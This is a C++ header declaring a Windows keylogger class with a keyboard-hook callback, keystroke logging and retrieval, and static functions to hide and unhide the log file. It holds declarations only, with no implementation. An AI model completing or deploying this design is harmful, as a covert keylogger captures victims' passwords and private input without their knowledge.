#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <windows.h>
#include <fstream>
#include <string>
#include <unordered_map>
#include <sstream>

class KeyLogger {
public:
    explicit KeyLogger(const std::string& filename);
    ~KeyLogger();

    void start();
    void stop();
    std::string getLoggedData();
    void clearLogFile();

    static void hideFile(const std::string& filename);
    static void unhideFile(const std::string& filename);

private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    void processKeyEvent(DWORD vkCode, BYTE keyboardState[256]);

    std::ofstream outFile;
    HHOOK hook;
    std::string filePath;
    bool running;
    DWORD threadId;

    static KeyLogger* s_instance;
};

#endif // KEYLOGGER_HPP
